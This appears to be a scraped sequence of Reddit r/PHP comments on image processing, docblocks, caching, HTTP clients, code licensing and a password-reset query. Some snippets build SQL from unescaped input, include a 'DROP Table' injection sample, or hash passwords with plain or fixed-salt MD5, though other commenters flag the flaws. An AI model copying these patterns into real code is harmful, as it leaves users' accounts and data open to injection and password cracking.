Excellent, thanks - this is exactly what I was looking for. The only thing would be that the image has to be ready in the time the user uploads the images, and submits the form - the form then will then generate the main listing ID, which I'll then use to rename the images and ship them off the S3. Any suggestions on that portion? My main problem is I don't have a listing ID yet - and the renamed images are returned from the image upload controller since SWFUpload does it that way, which is then added to the form. Though I'm thinking to maybe rename them differently - except the upload script returns the formatted file names. But I'm thinking Gearman can also handle the upload to S3. Gearman would also be useful in deleting accounts and things like that. 
why dont you write the files on disk in a temp folder, write the path inside a queue (database or redis) and have a cronjob running every 20 seconds looking for new "jobs", popping out 10 at a time and quitting when done. this is a pretty simple solution of course but less work than gearman and less issues with starting a process for every upload.
I could do that, but I guess I'm not sure of the timing. The images are uploaded separately from the form itself (it's how SWFUpload works). I guess as long as the images are available by the time the user finishes submitting the form (which would be seconds after). I have to see how to do this...
look up node.js and image upload. that would solve the process issue too.
I believe we're currently using GraphicsMagick at TwitPic, but we have also used ImageMagick in the past. Either should work fine for you.
What are the benefits of using gearman instead of, say, dedicating a power server to image processing? I'm genuinely curious. I send all my photos to upload.example.com, for example, for processing, and then save them to another server, static.*.example.net, that has minimal memory and CPU, but tonnes of storage capacity. 
&gt; I'm allowing images up to 2/3MB Just a quick aside, what really kills the processor is not so much the size of the image, but its dimensions (for example, 5000 x 5000 = 25 megapixels = *a lot* of memory). 
Yeah, hopefully a 2/3 MB limit will restrict down the dimensions. I have a separate memcache box, perhaps I can farm out the sizing stuff to there. Though it's probably overkill (let's hope so!)
Gearman doesn't do image resizing. It is a generic job queue type system which allows you to queue up lists of 'jobs' which are then 'processed.' You can write a job worker for gearman which resizes images though, and then at that point build an entire farm of boxes dedicated to resizing images, should you desire.
It's been a while since I last had to deal with the image processing stuff on my project, so I've forgotten a lot of the minute details, but I do know that the megapixels and size of a photo tend to grow together, but there are some weird photos out there that would throw errors. Aside from just filtering the size of photos, you should add a constraint on the megapixels of photos. The math for calculating it is width*height/1million. You'd be safe to add a 12-megapixel ceiling against 64MB of memory. Here are some links to approximate memory usage: * [http://alexrabe.de/2008/05/13/understand-gd-library/](http://alexrabe.de/2008/05/13/understand-gd-library/) * [http://www.charles-reace.com/blog/2009/11/18/memory-usage-in-php-gd-image-functions/](http://www.charles-reace.com/blog/2009/11/18/memory-usage-in-php-gd-image-functions/)
Why two #s?
I believe because it is one of the larger channels; it might also have to do with the fact that it has an over-flow channel. I'd also like to add that PHP core devs and other prominent PHP community members lurk in ##php, but usually under a pseudonym....you gotta sniff them out ;) But it's really cool (and useful) to get the _real_ scoop on things sometimes.
Frameworks only accomplish the "takes less time" vector if you already know the framework but at the moment I don't so picking one up now would only increase the complexity of the application.
On freenode channels with two hashes are unofficial. It has nothing to do with the size of the channel.
The power server would do the actual image processing, but it wouldn't hold up the web server while doing this. The user uploads his / her image, a request is made in the background to the gearman server, which then distributes the work to any available worker (which can live on one of your power servers). The worker can then either handle all the work itself, resizing, optimizing and then copying i to the static server, or you could divide it into several workers / tasks, one for handling the resize, one for handling the optimizing and one for handling the distribution of the file. The worker would then create a new task when it is finished with its part of the job. Other message queues may be able to define a "work chain" that should be performed when a request comes in.
&gt; The only thing would be that the image has to be ready in the time the user uploads the images, and submits the form - the form then will then generate the main listing ID, which I'll then use to rename the images and ship them off the S3. One way to achieve this would be to add an identifier of "a listing creation session" (not to be confused with regular sessions), where you'd generate a random ID when the form is displayed, then associate any images uploaded with this ID. When the form is finally submitted, the ID is included and you can fetch any information and images associated with the ID. You may also use your regular listing storage for this, but add a field whether the listing has been created or not. Either allows a user to resume a form at a later time, or you to divide your form into several separate sections, where the user can save her values between each part of the form.
The layout is fucked in Chrome.
http://www.doctrine-project.org/projects/orm/1.2/docs/manual/hierarchical-data/nl#nested-set has a nice way to do this for the real world. Once you run into real performance issues you should be fine putting a caching solution (memcache[d]) on top of it.
Can we stop with this docblock bullshit all the time? /** * Subtracts a value from $_foo and returns the difference * @param int $subtract_me The value to subtract from $_foo * @return int The difference of $_foo and $subtract_me */ public function subtract_from_foo( $subtract_me=0 ) { return $this-&gt;_foo -= $subtract_me; } You don't need a 5 line docblock to describe a 3 (1?) line function, especially when the docblock adds no new information. Stop with the "it shows me stuff in my IDE!". I don't use your IDE and don't want all those docblocks clouding up the actual code. Just write clean code. Edit: and vim (and probably emacs) can show you those code hints too, stop with this vim and emacs hate. What a bad article.
Most IDEs work off phpDOC to help the intellisense. &gt; I don't use your IDE and don't want all those docblocks clouding up the actual code. The world doesn't revolve around you, I'm documenting code to make my life easier.
You're telling me the docblock in the example from the article is useful?
No, the example is a horrible one, and they should be shot in the face for creating it. One horrible example does not invalidate an entire class of coding practices. Docblocks have a tremendous amount of utility when used correctly. By *not* using them, you are doing little but making the future maintainer of your code a disservice.
Surely the point of the docblock is that you _don't know_ and _don't care_ whether it's a one-line function. When the docblock is compiled into documentation, it is used as a reference. The description, return type and expected parameters are all useful information when you're reading documentation, even if the actual code is only one line.
Thanks... it's been a long long time since I've dealt with images too, trying to dust off my memory. I'll be resizing all photos to a max height/width, and a thumbnail. I could probably check the dimensions first before too, I will give those a read
Hmm, I could do that, and store those sessions in memcache or redis, avoid having to hit mysql for that. I'm using CakePHP, btw
Nope, I disagree. Rather than writing it up again, here's what I had to say last time on the topic. http://www.reddit.com/r/PHP/comments/eo1v1/zend_studio_80_quality_at_a_glance/c19mx9v
Not even one point on unit testing.
Or a point on saving kittens.
Oh ok, thanks for the clarification.
20 Use a framework. It will cover at least half these issues for you.
It's also crap in FF and IE.
There are some good points there. Having useless docblocks is indeed silly, but they do have other redeeming properties. For example, at work we created a bunch of our own tags, and use reflection to grab the comment block on [methods](http://us2.php.net/manual/en/reflectionfunctionabstract.getdoccomment.php) and [properties](http://us2.php.net/manual/en/reflectionproperty.getdoccomment.php). We use this for heavy-weight testing and data validation purposes. A few ORMs use similar techniques as well. (Also, whoever is downvoting you has forgotten that downvotes *don't* mean "I disagree," they mean "you aren't contributing.")
I think thats the larger point I'm bringing to the table. Stop docblocking _everything_. PHPers, it's ok for a 1 line method to go without a docblock, you're not a bad programmer because every line isn't thoroughly documented, I promise you. In fact, my own ORM makes use of the Reflection capabilities to grab some meta information about fields in a model. My overall point being the example from the OP's link was retarded, and it's spreading harmfulness that leads to everyones panties getting in a knot when they're told maybe using docblocks for everything isn't a good idea.
Joining up the excel sheet with your SQL table is fine. I'm not entirely sure why you're so against my method for changing passwords; however, I have no idea how likely someone is going to want to exploit your system. It could never happen, and if you're confident in that then go for it. But, say for instance this website is a small yet close community of friends/college students etc, they know each other's usernames and possibly email addresses. What is stopping them from taking the URL that got sent to them and replacing their username with someone elses? This is why i believe it's important to use a unique code and have an expiration time for resetting the password. To do that you need them to ask for it to be reset (Otherwise your email could be sitting in their inbox for a month and the link would no longer be valid).
From point #4: &gt; Every time you violate best practices because the right way seems "too hard," BP dips a kitten in crude oil. 
Or at the very least a template engine like [Twig](http://www.twig-project.org/) to keep HTML and PHP separated.
oh ic. I had no idea. Cool thanks for the info. hmm probably going to use API's of current domain registrars.
Great tut thanks.
That's more a way to avoid killing kittens. If you really want to save kittens adopt one from your local humane society or shelter. Don't have room or are allergic to cats? Donate money to one. Spaying or neutering also does wonders to reduce the number of kittens who suffer needless dipping in crude oil.
Or use a template engine like PHP
That's not a community, but a blog aggregation website. Not saying it's a bad website, just being pedantic.
`class homework { const MINIMUM_PERCENT = 0; // lowest possible grade const MAXIMUM_PERCENT = 100; // highest possible grade public $assignmentName = 'lab 01'; // e.g. “lab 01”, “assignment 02” or “quiz 04” private $gradePercent; // this particular homework’s grade (0 – 100) private $student; // Student object public function __construct(student $student, $gradePercent, $assignmentName = "No-name #01") { $this-&gt;student = $student; if(($gradePercent &gt; self::MINIMUM_PERCENT) &amp;&amp; ($gradePercent &lt; self::MAXIMUM_PERCENT)) { $this-&gt;gradePercent = $gradePercent; } $this-&gt;assignmentName = $assignmentName; } public function setAssignmentName($assignmentName) { if((preg_match("/^[a-zA-Z]/", $assignmentName)) &amp;&amp; (preg_match("/[\d]$/", $assignmentName))) { $this-&gt;assignmentName = $assignmentName; } } public function getAssignmentName() { return $this-&gt;assignmentName; } } `
If you are in Sweden I'd recommend Loopia because of their great API
Dude, just download Media Center Master: http://www.mediacentermaster.com/ It has a free option which does exactly what you have outlined plus you won't have to do a damn thing. That said, if you still want to do this in php, and your script is timing out, just increase your execution time in php.ini or your script. http://php.net/manual/en/function.set-time-limit.php
Nein, if you want to confuse someone on the onset sure use Symfony, nothing like Yaml to drive you bat shit insane. I personally use Zend but won't recommend it, I think Kohana or CI would be suitable for someone just entering the fray.
Only because a blog post had an embed that was pretty large. Otherwise, it's fine.
I don't want to have to have that program running all the time on my server though just for that purpose. I'd rather have a script that can just be run when they access the web page. As far as your second point, I've increased the time to 300 seconds and it still times out. Doesn't even make it down through the "C" movies.
I'm not entirely familiar with themoviedb.org, but it looks likely that your bottleneck is querying for all 500 movies every single time you load the page. Since which movie is in which file doesn't change when you reload the page, you can just store the filename/movie name pairs locally (caching), and only query the API when your script encounters a new file. So your algorithm would look like this: 1. Read the directory listing 2. Read your cache. You can just do this with a plain text file, but there are a myriad of other options - go with the simplest first. 3. Go through the directory listing, and if you find that a filename already has a movie name attached to it, output it, otherwise query it and add it to your cache 4. Save the cache with any new movie data, possibly factoring in deletes as well.
you should just use python for this
softlayer domain/dns api. have fun. inwx.de has a domain robot, and so have most first level resellers.
Yes, this is what I'm looking for. :) I just have no idea how to write that code. :(
I'll throw my hat in for Cake as well. I've worked with a number of other big ones, Zend, Symfony, etc, but Cake has always been the one that I liked the most. The key foundation of it is convention over configuration, which I realize isn't for everyone, but it works well for me. Contrary to what some others may say, I don't see Lithium taking any market share away from Cake. It's a completely different framework with a completely different set of goals and has little to do with Cake other than the fact that it has previous Cake developers attached to it. Night and day difference between the two.
use curl but in the shell. not the curl extension. curl over shell is (and i actually benchmarked it ~2 years ago) faster than any other http request method and its actually not hard to build a wrapper. 
Ok, so what we want to do with the cache is to attach some data (the movie names) to some keys (the file names) and store it in a file. To represent the actual cache in PHP, we're going to use an associative array. Setting values in an associative array is a simple operation: $array[$key] = $value; Applying this to our scenario, we can imagine something like this: $cache[$file] = $movie_name; Actually, here it's a little more complicated, since there are multiple data values for every key. So instead of just storing a single movie name with a key, we will append each value as we come across it to an array: $cache[$file] []= (string)$mov-&gt;name; The []= is just PHP shorthand to append a value to the end of an array. We also have to use (string) to force the value to become a string. I'm going to skim over why we have to do this for now, but if you're interested you can look up "typecasting" and the SimpleXMLElement format. To set the cache itself, it's a simple matter of putting this code in where you're currently querying the API. Adding it to the code might look like this: if ( the directory entry is valid ) { // query the API foreach ($xml-&gt;movies-&gt;movie as $mov) { $cache[$file] []= (string)$mov-&gt;name; } } Of course, the whole point of the script is to print out this data: foreach ($cache[$file] as $mov) { echo $mov . "\n"; } Now, as the code is, it will still query the API for every movie, so we should add an if conditional to check whether or not the file name is in the cache before we query it. Now, your code might look like this: if ( the directory entry is valid ) { if (!isset($cache[$file])) { // query the API foreach ($xml-&gt;movies-&gt;movie as $mov) { $cache[$file] []= (string)$mov-&gt;name; } } } foreach ($cache[$file] as $mov) { echo $mov . "\n"; } The isset() function checks to see whether or not a given variable is set. Of course, we want to check whether or not the value isn't set, so we negate the result with the ! operator. Now it's time to actually save the cache. To do this, we'll use JSON, a text-based, simple, human readable serialisation format. PHP has two built-in functions to deal specifically with encoding and decoding JSON, aptly named json_encode() and json_decode(). Since JSON is text, we can just write our encoded JSON directly to a file. From this, to save the cache, we should do something like this at the end of the script: file_put_contents(CACHE_FILE, json_encode($cache)); Then, reading the cache is a similarly simple procedure, with something like this near the start of the script: file_get_contents(CACHE_FILE, json_decode($cache, true)); (the second argument to json_decode is just to tell PHP that we want to decode as an array, not an object) Putting it all together, you'll have something like this: file_get_contents(CACHE_FILE, json_decode($cache, true)); while ( reading the directory ) { if ( the directory entry is valid ) { if (!isset($cache[$file])) { // query the API foreach ($xml-&gt;movies-&gt;movie as $mov) { $cache[$file] []= (string)$mov-&gt;name; } } } foreach ($cache[$file] as $mov) { echo $mov . "\n"; } } file_put_contents(CACHE_FILE, json_encode($cache)); There are still a few pieces of the puzzle missing, but I trust you'll be able to work them out for yourself. Good luck!
okay reddit is broken, i cant edit my comment for some reason. look up curlobjects on github. its probably what you want to build.
Yes.. I too support Kohana
oh nice! Thanks man. I actually ordered my server from softlayer
Use a cron to run a perl script to get a list of movies, and pull the data from themoviedb.org; store all of this in a file(preferrably in CSV and also store it in php-accessible folder). Have PHP render the page based off information from the file the perl script makes. Edit: the cron job isn't necessary; you can run the script manually, but it can be set for daily, hourly, weekly, etc and is oh-so-convenient. tldr; make perl do the dirty work.
Saying that and not providing a link to such a benchmark is not entirely reliable. Why is "wrappering" a shell_exec() or exec() type command to curl better? Not only do you have to wrapper the calls (and be super careful of what you're passing to a shell command) but you've got to interpret the response well enough to do some of the same basic error handling that the curl extension does already. I'm always open to learn more, but on it's face, this doesn't seem like good advice to give -- even if the shell curl solution *is* faster, in some minor way, I imagine the overall gain is negligible compared to the safety and standardization that the extension gives. To the OP, I would suggest a library that utilizes curl and falls back to something else if if absolutely most. Here's some more info on the topic: http://willnorris.com/2009/03/http-client-library-for-php How far you'll need to fall back is a matter of how complicated your API is. If you requires support for redirects/cookies/obscureheaders/etc, then a basic "fopen" probably won't suffice. Realistically, however, it is not out of the question to simply require the curl library be installed. Doing a systems check with if (!function_exists('curl_init')) { die ('Please install curl extension'); } is not unacceptable. I imagine the vast majority of php installations have this. (Also, you'd need to do a check like this even if you did create a shell wrapper type function to make sure that shell calls worked AND that curl existed on the system)
i already said, use curlobjects. completely oop build curl wrapper i started building with a friend almost 6 years ago. im working with php since 1999. using curl in the shell to build an api is def. a good idea. we did it, he can do it. what else is important with http request for the person who will use the library? how easy it was to code for the developer or how fast the script will process data... guess what, its the speed. 
I would go with the cURL extension. Also, I would check out [Zend HTTP](http://framework.zend.com/manual/en/zend.http.html). It may be too big of a dependancy for you (but then so could requiring a curl or http PHP extension). It allows for connection adapters (curl, sockets) and has support for things like file handling, cookies, etc. If anything it may be a good starting point you could refactor to fit your needs.
This is almost like asking for a tutorial on how to write Windows.
So, it's been 5 months since you posted this. Have you used or been using TomatoCMS? I am looking at it because we have zend developers working with Magento and want to leverage that skill with TomatoCMS also.
Awesome explaination! Here's the updated code based off of what you told me: http://pastebin.com/hLV2AfU3 Although, when I try to access it, I get this: Parse error: parse error in C:\inetpub\wwwroot\movies2\index.php on line 19 Line 19 is: while ( reading the directory ) { Not sure what I need to change to make it work.
I have a lightweight class called [HTTPRequest](http://github.com/rmccue/HTTPRequest) which supports GET, POST and HEAD requests on cURL and via fsockopen. I'm also working on PUT and DELETE and more transports. Edit: Also, no outside dependencies, and it should work with a standard autoloader (replace `_` with `/`, add `.php` to the end). Comments (and criticism) most welcome.
The code I provided is actually some (admittedly very PHP-like) pseudo-code, which is not intended to be copy-and-pasted verbatim into your code, but to illustrate the concepts behind the code. For example, on this line: while ( reading the directory ) { "reading the directory" is not actually a valid PHP construct, but if you read the line as something resembling English, you can see what I actually mean. In this case, you already have code that does what that line is supposed to convey here: while(false !== ($file = readdir($dh))) { (which, by the way, can be written in a simpler form) while ($file = readdir($dh)) { So, you'd replace my pseudo-code line with the existing line that I just showed you from your own code. This is also true for the other "plan English" parts of the pseudo-code I provided. You already were able to test if "the directory entry is valid" and to "query the API", and you can just replace these parts with the working PHP you already have. One caveat I forgot to mention is that "CACHE_FILE" is intended to be a PHP constant, but I forgot that PHP treats unquoted strings as strings anyway, so you might want to change those CACHE_FILEs to PHP variables, and define it at the top like you did with $media_dir.
5 minutes really isn't that long when doing automated API queries like this; especially if you have a library of over 500 videos that you're checking. For something like this, and considering that the library is going to *grow* over time, I wouldn't even have a time out. Set it to 0 and be done with it. In fact, if I were you I'd also set some sleep() commands after each check just so you're not flooding the service with rapid fire calls all the time. btw, why are you checking all the movies all the time anyway? it's not like new assets are added that often and the load you're throwing at thetvdb is what I would consider excessive (to put it mildly). Wouldn't it be more resource friendly for your server and for thetvdb to just check the new shows? 
The only way to make it reasonably-sorta-secure would be to compile your code to bytecode before releasing it, using something like [ionCube](http://www.ioncube.com) or [Zend Guard](http://www.ioncube.com). Otherwise anyone can just delete your authentication code from the source and use it freely. NB: there are bytecode decompilers out there for both of these products... there not widely available but they do exist.
Just force them to use your application, charge them isk or hosting fees and throw a ton of ads on there.
Can you link to what library you're talking about? I could only find [this one](https://github.com/bobdia/CurlObjects) and it does not do requests to the shell. Another reason building a shell executing curl library is a bad idea is that it will fall apart on any server built on windows where curl does not come preinstalled. Considering the request was to build an SDK, likely to be distributed, it'd be better to not completely ignore that segment of users. Finally, you don't need to justify your programming experience as I don't care, I'm not attacking you. I am, however, not in favor of your suggestion. If you want to say it's better, and you claim to have done benchmarks, produce them. I've a personal interest in this myself as I could find useful applications of a faster library in my own work. 
&gt; there are bytecode decompilers out there for both of these products And all it takes is one person to undo the encoding, remove any other checks you put in, and copy the code. This is not a case where a technological solution is the best one. If you want to protect a codebase, get a lawyer and draft a contract/license that the users must agree to. This is just as important if you intend to actually sell the code, as opposed to give it away. If you want to make it free and don't mind the whole open source thing, [slap the AGPL on it](http://en.wikipedia.org/wiki/Affero_General_Public_License) and you'll never have to worry about unauthorized copies again, because the mere act of hosting the app requires distribution be possible.
Both the extension and the shell uses libcurl, except loading in a different executable will generally be slower. Show us the benchmarks
If you don't want to rely on CURL being there, you can also use php streams. http://php.net/manual/en/context.http.php
&gt; And all it takes is one person to undo the encoding, &gt; remove any other checks you put in, and copy the code. Exactly. &gt; If you want to make it free and don't mind the whole open source &gt; thing Right, but that's not what the OP was asking. You can't ensure that your code "phones home" without closing the source. (Whether or not "phoning home" is a wise or ethical idea is a different question, but not one that the OP asked.) &gt; slap the AGPL on it and you'll never have to worry about &gt; unauthorized copies again lol, no. This assumes that 1) everyone who would be pirating your code is in a country that gives a shit about copyright/license infringement, and 2) you have an bottomless warchest to fund your legion of lawyers. ionCube/Zend are hardly perfect solutions but they require some skill (or connections) to reverse engineer, and as long as your product is not popular enough to be a huge target for crackers, you can usually prevent a lot more piracy with obfuscated bytecode than with empty legal threats which aren't enforceable in most of the world. 
You can't make controversial statements without having the numbers to back it up. How long you work with PHP is irrelevant in this matter. I for one would not want to see hundreds of apache processes forking curl. If you do the occasional requests once in a blue moon it might not matter as much though. But in that case speed is less relevant too. Most of the time would be spent waiting for io anyway.
haha 
It's kinda true...
The only way that any protection that connects to an external server will work is if that external server performs a function that is required by the product in order to be useful. If the protection is just "hey, am I a valid copy?" "yes!", then someone can easily just remove the checks and nothing is lost. If the protection is "can you calculate something simple that I need?" "&lt;result&gt;" then that function is easily replaced with a local copy by someone clever and nothing is lost. If the protection is "some really complicated task that isn't easy to replace, but is absolutely vital for this product to be of any use", then you might have a chance. Just like games/movies. Anything that is inherantly offline is easily breakable - all single player games are usually always crackable. Online games which require a central server tho' are a different story, because the games require that server to work, and if the games company keeps the servers all under their control and enforce a game key check, then you'd need to hack the game servers to be able to play without a key (which wouldn't work for long - they'd notice and repair the damage!) If that makes sense? :P PHP on its own - not a chance. PHP compiled into some sort of obfuscated binary format as mentioned in the other answers (with accompanying server module) - maybe a while, but the code needs to be decoded to run, so if your code is worth stealing, there'll be someone clever out there who'll do it (i.e. just like a DVD, you have an encrypted movie *and* the key - why did they ever think that that'd work?!?).
srsly? for i &lt; 10000 request to google.com index with curl_init for i &lt; 10000 request to google.com index with exec curl how hard is that? if i really have to back _those_ numbers and you cant write 3 lines of code yourself you shouldnt ask for the numbers.
Basically, no. If it is going on their server it wouldn't take much to change: $isAuthenticated = checkAuthentication($domainName); to //$isAuthenticated = checkAuthentication($domainName); $isAuthenticated = true;
I'm doing something like this at the moment (for a WordPress plugin), and it's really not worth the effort making it so that users can't edit it. The majority of our users will be fine with paying what we charge (which includes a basic support package). (Our code is actually GPL'd, which is both required as it is reliant on WordPress, but also because we want to GPL it).
cURL is not a HTTP library. It does that stuff only as side job. And it has the most shitty API conceivable. (See, I'm all for avoiding object fluff and using procederal interfaces where possible, but that one is a joke.) That being said, it's indeed more widespread. The new HTTP extension would be more appropriate in any case, but it's enabled on very few production systems. Then again, you should avoid the dependency avoiding. Zend_Http or PEAR Http_Request2 are good options (with more sensible defaults than curl). If you want you can even find a lightweight class around the http stream wrappers and file API (allows for POST and PUT requests too).
+1 streams with contexts is the way to go. that's the most "native" option for php and still is very flexible.
pdo and pdo-mysql should be installed from php's sourcetree (or packages, if your system supports those). versions in pecl are outdated and exist solely for historical purposes
Fair enough. You'll probably have to make the initial proposition more attractive/interesting. Most PHP coders have about a million personal projects on the go that they're just trying to get free time to work on.
If you're wanting something basic that'll help you learn a bit you can check out [phpuserclass.com](http://phpuserclass.com) - It's fairly easy to grasp and a good base class to start with in my experience. There may be some better options out there if you're looking for a full on management script with everything already done for you.
Ok, so for the sake of it I tried this out, and you are wrong. http://pastebin.com/P9xgZ8vs test_curl 100 times took 17.064754009247 sec test_curl_exec 100 times took 19.199462175369 sec
While I am a HUGE fan of using PHP's stream mechanism over curl, I've found that it is unreliable because it does not reliably parse HTTP/1.1 before PHP 5.3.0 and it can be disabled on shared hosts if they set the allow_url_fopen ini setting to 0. I've also had some bugs with it related to 302 and 500 responses, after which I decided it was time to move onto something more reliable.
How do I go about doing that on Ubuntu 10.10?
`apt-get install php5-mysql` I think
I'm not on Ubuntu right now but I believe PDO is built-in to the `php5-&lt;db&gt;` packages (so for example, `php5-mysql` will install ext/mysql, ext/mysqli and ext/pdo_mysql). Not sure if that enables them as well though, try installing the relevant packages (php5-mysql, php5-sqlite etc.) and then enable them in php.ini and see what errors get thrown up. Of course the other reason could be that you haven't enabled PDO in php.ini so check that's been done as well.
Seconded. I've learned a lot from extending that script.
Well the simple answer would be to give them an API key and an interface to access the information via the API but keep all of the business logic and data storage behind the API. That way they couldn't cut you out without a massive (if not complete) re-write and it gives you a large data resource to mine for information. You can build entire business models off of selling this non-specific information and service.
I was specifically responding to: &gt; So I'm wondering what community everyone else uses to keep up with whats going on around PHP
Holy cow! This is the first time I've seen a variant of this question with a useful answer! 
There is [uFlex](http://crusthq.com/projects/uFlex/): very easy to use, understand, and adapt. Out of the box it uses the old mysql-extension of PHP. To use DPO of mysqli, you have to adapt the class.
I strongly disagree with number 8. Just pick editor you like. There is no need to use IDE just because it has more features and build in debugger. I have much much better workflow with ssh to remote machine and vim+bash terminal. I personally don't like IDE's, but if you like IDE, use them.
why would you do it in perl when you can as easily do it in php?
http://mkfblog.blogspot.com/2010/10/ubuntu-php-pdo-and-mysql.html
Same here, it seems a lot of big hosting companies opt to disable allow_url_fopen. If you need portable solution I would suggest fallback to curl.
Fair enough, but I think if he's ready for an MVC then he's ready. Personally I think that the whole concept of MVC is much harder to get that yaml.
I wish I could find an IDE that worked like the old school ones did. You can just open a file and have the debug ability. All the IDE's I've tried have too much bloat. They require you to setup a whole "project" in a way that is specific to how they say it should be. I'm looking for something like the older C++ compiler bloodshed for PHP. I am not hardcore, but it just seems easier to use a browser and a text editor to write code.
Wow, it's nice to see that CI is still evolving. Still, for my current and future projects i'll use fuelphp. It's young, but very promising.
This one ranks very high in Google. http://www.evolt.org/node/60384 But it's quite old and might be outdated.
I'd already looked at this and it seems ideal, just looking for something more recent with an admin backend.
It actually does have a backend, but it's a bit limited. The idea being that you can add whatever you want to the admin panel or create your own based off the code. Additionally you could have various levels of admins each with different admin panels. I've worked with it quite a bit. If you want to PM me I'd be glad to chat it out with you.
I've implemented this one as well, it was pretty easy. It can get costly based on the amount of users, but it is real slick. http://www.janrain.com/products/engage
You're kidding me right? Nobody mentioned Stack Overflow yet??
echo "&lt;td&gt;"; if($ip == $row['ip']){ echo "DELETE"; } echo "&lt;/td&gt;";
change WHERE email='$uemail'" to WHERE email='".$uemail."'
Give out the table structure: show create table members \G Will help people provide debug help. Off the top of my head, though, the query updating two values looks valid.
I'm not sure about the problem you are experiencing, but it would help to see the table structure. Do: show create table members; And post the output. Also, I don't see you escaping those strings - that's not a good idea, especially for email.
You can put variables inside of double quoted strings. You sometimes have to use {} delimiters around them, in the case of arrays and objects. Try this: mysql_query("UPDATE members SET activated='Y', passwd=MD5('$unewpass') WHERE email='$uemail'") or die(mysql_error()); Simplifies things a bit and also will print out an error if there is one.
how should I be doing it? 
that worked!! Thanks timdorr! Gimme your paypal account, I'll forward ya $5. I'm confused about how this worked though.. I gotta start paying attention to what I'm doing when I write php.. a lot of the time I borrow bits from other parts of my pages rather than write from scratch &lt;-.-&gt; Also, whats the benefit of always including the "or die..." part of a query? I mean... I can't imagine a scenario where it wouldnt work unless the database was down. I guess you're just coding for that possibility? 
Deciding whether it's edible or not by IP is probably not a good idea. Most people don't have a static IP and many different computers may share the same IP.
It was the first thing that came to mind. Is there another simple way? I don't want to create a login or anything.
Thanks this makes sense, however didn't work upon changing. I will look into this further. In the other &lt;td&gt; above, the $row is surrounded by "." what purpose does this serve?
There is going to be a login event required regardless in order to secure content. Is there a particular reason you don't want a login?
Ternary operator? echo "&lt;td&gt;" . ($ip == $row['ip'] ? "DELETE" : "") . "&lt;/td&gt;";
The . is used for concatenating strings together. You have a mismatched &lt;/a&gt; floating around in there and your &lt;/tr&gt; should be inside your loop as well. 
Simplicity. I'm not too worried about security for this is only a learning project. I need to get a little more comfortable before I jump in the deep end.
You could use a cookie, or have them create a edit password on creation.
 $sth = $pdo-&gt;prepare(" UPDATE members SET activated='Y', passwd = :mdpass WHERE email = :uemail") $sth-&gt;execute(array( ":mdpass" =&gt; md5($unewpass), ":uemail" =&gt; $uemail )); If you're not using PDO then you probably should be.
I have a link in my code, I removed it to post here. Guess i missed the &lt;/a&gt;. Another thought, I tried to use $row['artist'] outside the loop below it but didn't have any luck. Is this possible? Thanks for your help!
Thanks I'll try those.
`&lt;?=($ip == $row['ip'] ? "DELETE" : null)?&gt;` But you should really be doing things using templates.
Give this a try... strtotime("+" . (date('t') - date('h') + 1) . " days")
This is a known issue with the [DateTime::modify()](http://php.net/manual/en/datetime.modify.php) function, due to limitations in [strtotime()](http://www.php.net/manual/en/function.strtotime.php). Unfortunately, looking at the user notes on the strtotime(), there's no elegant fix. The solutions provided all do it manually or defer to MySQL.
With no offense to timdorr, the "or die" construct is a sort of lazy anti-pattern. Ideally you'll want to test for failure and display a more user-friendly error page.
This. While md5ing the password prevents SQL injections from the password, the use of $uemail (EDIT: By the OP, not haywire) without escaping looks like a likely vulnerability. 
What kind of templates? Is there someplace I can read up on this?
This works. Thanks!
Let's just hope Bobby Tables doesn't create an account in your system. See the top comment about PDO and do it right.
Salt the password. Just MD5'ing the password is bad. An easy way to do this is set a constant in your config file, something like: define('PASSWORD_SALT', 'bl4hbla4hl0ngrand0m5r1ng'); To generate the password: md5(PASSWORD_SALT . $unewpass); Whenever you want to check your password, just concatenate the salt onto your password. You could even create your own function to do this for you so you don't forget, and instead of doing MD5, just call: my_password_hash($password); Have it return to you the password. This is just the tip of the iceberg, but trust me, if you use a salt with your password, you've avoided one of the simplest mistakes people can make without realizing it.
Have a look at something like this: http://www.smarty.net/
PEAR's [HTTP_Request2](http://pear.php.net/package/HTTP_Request2/) is pretty good. Anyone telling you to use the cURL extension is crazy, it's a huge pain to work with.
With ubuntu, I install my lamp stack with 2 commands: ` apt-get install phpmyadmin apt-get install mysql-server `
Use sessions.
Shouldn't you create a random salt for every password, then store the salt (or a two-way encrypted version of the salt) in the table? This would prevent someone who was able to crack one user's password from easily getting all the users' passwords. Also, wasn't there a big hullabaloo recently about how you should never use simple encryptions like sha or md5 anymore (opting instead for something like blowfish)? An encryption like blowfish takes much longer to calculate, and thusly would take exponentially longer to brute-force.
I dont understand how its a vulnerability if all the scripts get executed server-side.. something ive never understood. bah.
Your server doesn't have the correct timezone settings. Try running a script with `echo date('Y-m-d g:ia');` It can be an involved task to set all of the right settings on your server.
The "or die" part is defensive programming. It's like defensive driving. You treat other code as if it could blow up at any time; catch any possible errors and handle them gracefully, rather than letting the user see them and possibly confidential information. Many things could go wrong: the database server could go down, the database might be deleted, you might change the database schema and forget to change the query, there could be congestion that causes a timeout etc. In short, always code defensively. On another note, don't use that working code since it has a massive SQL injection hole. If someone entered a carefully-constructed value into the email address field, they could actually execute their own SQL query against your database. This could be as innoculous as changing someone's details, to logging in as administrator or even deleting the whole database. As *Laziness* said, use prepared statements with PDO instead. It's not hard to do, and it's a lot more secure.
If your taking in variables from a user, post or get, then you may be vulnerable to sql injection. Used prepared statements.
You can submit POST/GET data directly to a server after pulling the form input names from the HTML source code. If they put " ', DROP Table..." as an email it will execute on teh server side.
The "or die" style is kind of like defensively driving a Yugo on the interstate, compared to a try/catch with clear exceptions. Which just happens to be another good reason to use PDO!: try { $st = $some_pdo_connection-&gt;prepare($some_query); $st-&gt;execute(array(':some' =&gt; 'parameters')); } catch (PDOException $e) { do_something_with_this($e-&gt;getMessage()); } (i really want to see mysql and mysqli get deprecated. in the face.)
